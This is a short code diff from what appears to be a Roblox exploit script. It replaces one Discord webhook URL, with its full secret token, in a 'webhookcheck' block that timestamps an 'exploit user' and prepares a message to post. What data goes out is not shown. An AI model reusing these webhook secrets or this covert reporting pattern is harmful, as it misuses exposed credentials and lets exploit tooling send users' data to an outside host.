@@ -10,7 +10,7 @@ local webhookcheck =
     "Random Exploit User"
     timestamp = DateTime.now():ToIsoDate()
     local url =
-    "https://discord.com/api/webhooks/1010877755975553024/4B3YJTPhCW-0lL_EHyxu7bo_rDv01AI9B_uiyeJ7DcRCN7q7L1SmqCYcQ6dwxKw40GCl"
+    "https://discord.com/api/webhooks/1011354255489253376/5fdkhXRRaMBQncjosXm8uQf9J8JeAVZM3_qPfvPgF95FDsVGHR9bbcMLn1BdVYRKqepF"
     local data = {
     ["content"] = "",
     ["embeds"] = {
